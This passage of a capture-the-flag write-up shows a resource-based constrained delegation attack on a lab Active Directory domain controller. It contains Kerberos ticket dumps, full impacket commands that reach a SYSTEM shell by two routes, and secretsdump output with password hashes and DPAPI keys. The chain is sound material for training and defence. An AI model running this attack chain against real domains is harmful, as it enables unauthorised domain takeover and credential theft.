      8hMUQWpk1NQsFS1eq4WIPols9A9Fs4Uaw62GxImm0ipJe7uI0Zy+Hp2tp8bjxmt0P2LJCYIgktu3ZWVJ
      Yaprgm5gR1ZWL+P7Qn5eqj3vmq7JwEkDrvRM2bUrkdQu5y+ytH7t+ODSBaBsmJQ6DK6J0bdBkQLYOidQ
      9OzJ5QLzrZavZvF4qVLSilkRzSRxpkBr9ToWKwlFrljYxeViCBYgS03OmlAa6hUmT1xPXyLiEBaG6ccN
      3iyDlJu3bRMK5ubToIsAZTdLhC8TSZa6iexHVRVFrtTonltBdod8cmDPCBZGjWacUOKcH8vDFoVixLkE
      6HvHUQiVmO+G5RwgZzYa5YYeuTODTqSZL+O3Y5QDMnScUSd47q7xi19apmRrBvEk07Vgv00WaCUKJG0p
      dtbL9C0SQirwBV4/NIyjPV9NzmiJ/PkIFDeuQF6AHJqkL82D/9hX/980VO7zn1gGBgjxLfvpKUr0pNEg
      us/+JhS4kmGAAn0qvstbkTY/J/vU9QWPSx/+VjGAEdKer6i6qgAju7YMVNbvGXwiziK20P57BbZQ/9W4
      +BgIlpAhElgRuQQfiH7mfKR/HZ+UHmM5qCtrkJy+PGFqXwQlUdMkn/A2Rcqwdjell5zQotOiTaE8ZqyB
      d3VRlTsGA+6rUHMdCiRVFUgO8UqY5XsjZfFFQjur1sM9I2l4Y937In7dMxjPR2iwO35NivFZML0c5eoU
      wFwJRYhJUEJi50j84nofYjQPYMsX1vjc9EbhZ5Y3RIx0xWNmPPILhcH1jDAQQqOB2zCB2KADAgEAooHQ
      BIHNfYHKMIHHoIHEMIHBMIG+oBswGaADAgEXoRIEEB3aPVGsQMNpIY7i0U7P+12hERsPUkVTT1VSQ0VE
      LkxPQ0FMohEwD6ADAgEBoQgwBhsEdGVzdKMHAwUAQOEAAKURGA8yMDI0MTAxNjEzMzkzNFqmERgPMjAy
      NDEwMTYyMzM5MzRapxEYDzIwMjQxMDIzMTMzOTM0WqgRGw9SRVNPVVJDRUQuTE9DQUypJDAioAMCAQKh
      GzAZGwZrcmJ0Z3QbD3Jlc291cmNlZC5sb2NhbA==

[*] Action: S4U                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
[*] Building S4U2self request for: 'test@RESOURCED.LOCAL'                                                                                                                                                                                   
[*] Using domain controller: ResourceDC.resourced.local (::1)                                                                                                                                                                               
[*] Sending S4U2self request to ::1:88                                                                                                                                                                                                      
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'test@RESOURCED.LOCAL' 
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'administrator' to target SPN 'cifs/resourcedc.resourced.local'
[*] Building S4U2proxy request for service: 'cifs/resourcedc.resourced.local'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2proxy request to domain controller ::1:88                                                             
[+] S4U2proxy success!                                                                                                
[*] base64(ticket.kirbi) for SPN 'cifs/resourcedc.resourced.local':                   
                                                                                                                      
      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
[+] Ticket successfully imported!                                                                                     

```

After the ticket is generated, now I could get the adminstrator shell by utilizing Impacket tools. To do so, I'll first need to convert this `ticket.kirbi` for SPN `cifs/resourcedc.resourced.local`.

```bash

cat ticket.b64 | base64 -d > ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache                                                        
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
```

After the ticket is converted successfully, import the ticket by setting the `ticket.ccache` to `KRB5CCNAME` and run the following impacket command to get a shell. Oh yes, remember to add `resourcedc.resourced.local` into the `/etc/host` file.

```bash
export KRB5CCNAME=$(pwd)/ticket.ccache

impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.118.175
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file ZoKdnByL.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service DhyM on resourcedc.resourced.local.....
[*] Starting service DhyM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Tada, that's how I get administrator privilege shell. 

### Linux method

There's also a linux method to perform the same thing but using impacket tools. The first step is to add a new computer account.

```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.118.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'test2' -computer-pass 'Passw0rd!'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account test2$ with password Passw0rd!.
```

After that, Ill need to configure the target object so that the attacker-controlled computer can delegate to it.

```bash
impacket-rbcd -delegate-from 'test2$' -delegate-to 'RESOURCEDC$' -action 'write' resourced.local/l.livingstone -dc-ip 192.168.118.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Accounts allowed to act on behalf of other identity:
[*]     test$        (S-1-5-21-537427935-490066102-1511301751-4101)
[*] Delegation rights modified successfully!
[*] test2$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     test$        (S-1-5-21-537427935-490066102-1511301751-4101)
[*]     test2$       (S-1-5-21-537427935-490066102-1511301751-4103)
```

After that, I could just get a service ticket and pretend to be administrator.

```bash
impacket-getST -spn 'cifs/Resourcedc.resourced.local' -impersonate 'administrator' 'resourced.local/test2$:Passw0rd!' -dc-ip 192.168.118.175
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_Resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

After this, I could just get the administrator shell again after importing the ticket.

```bash
export KRB5CCNAME=$(pwd)/administrator@cifs_Resourcedc.resourced.local@RESOURCED.LOCAL.ccache

impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.118.175                                 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file NqRgqsfX.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service BigR on resourcedc.resourced.local.....
[*] Starting service BigR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Tada, both linux and windows could perform the same thing. Also since I have the ticket, I could also get the hash of the machine if needed.

- dumping hashes
```bash
impacket-secretsdump resourced.local/administrator@resourcedc.resourced.local -k -dc-ip 192.168.118.175 -no-pass   
Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                                         
                                                                                                                      
[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0aa9afb28ea147cc3ea3f6a974e2ba65:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::               
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets                                                                                               
[*] $MACHINE.ACC                                                                                                      
resourced\RESOURCEDC$:plain_password_hex:6460c6086ad5d92d07f186f2fca108769d9982d6d57f08d61c7e8275984217ca5aa9a0895b4b5c13904c045712353c5db0b9d34a8aac5a9970827f0d35d1bc782d2091f5aff3fee51a25d215cd8a6e2d6e79dcf277467c12fb3e5017be7d2cb873c
84270eaa27aac7033810501d2d6855572f040fc587db896d1ee5291ed59a22535a458328d8c0964e07b73ff0bdb0f7acec01c0e95f0c3703c24e4f843d098786906909919320d6351f6e64413e29b6e2a46cf6a892edcf1ef264017b448c1228528e47c5ceb38bf423ba5f574bc44ca7954ee65cd55d
0f07b685054ddce78ec2f105995c69c26c649f57c89bc2b96                                                                     
resourced\RESOURCEDC$:aad3b435b51404eeaad3b435b51404ee:c15c21718e8b9ec0f9f04b19cb33df8d:::
[*] DPAPI_SYSTEM                                                                                                      
dpapi_machinekey:0x3df657e4617398e4ab73e41c6183f8ac3d608523       
dpapi_userkey:0xc69b79bdce1e77b22043bbb5bd336c39d3965012
[*] NL$KM                                                                                                             
 0000   4A E2 C6 53 5D 77 02 C9  AE A9 48 23 7C 5B 46 39   J..S]w....H#|[F9
 0010   4A 56 02 3B CC 38 B8 C0  92 DD 41 2C 72 F2 63 46   JV.;.8....A,r.cF
 0020   71 36 1B E3 D2 BA E7 AC  8C BD E9 D5 55 36 C0 07   q6..........U6..                        
 0030   99 5A 11 4A 24 E4 42 E3  4C 12 3F F5 1B D7 D5 8C   .Z.J$.B.L.?.....
NL$KM:4ae2c6535d7702c9aea948237c5b46394a56023bcc38b8c092dd412c72f2634671361be3d2bae7ac8cbde9d55536c007995a114a24e442e34c123ff51bd7d58c
...
```

## Things I learned from this machine

- `rpcclient` to get username and their description or just use `enum4linux-ng` to auto enumerate but need to see carefully
- `smbmap` to download every file in the share.
- `sharphound.exe` to get data to be dumped in bloodhound
- GenericAll to a computer = can perform based constrained delegation attack. 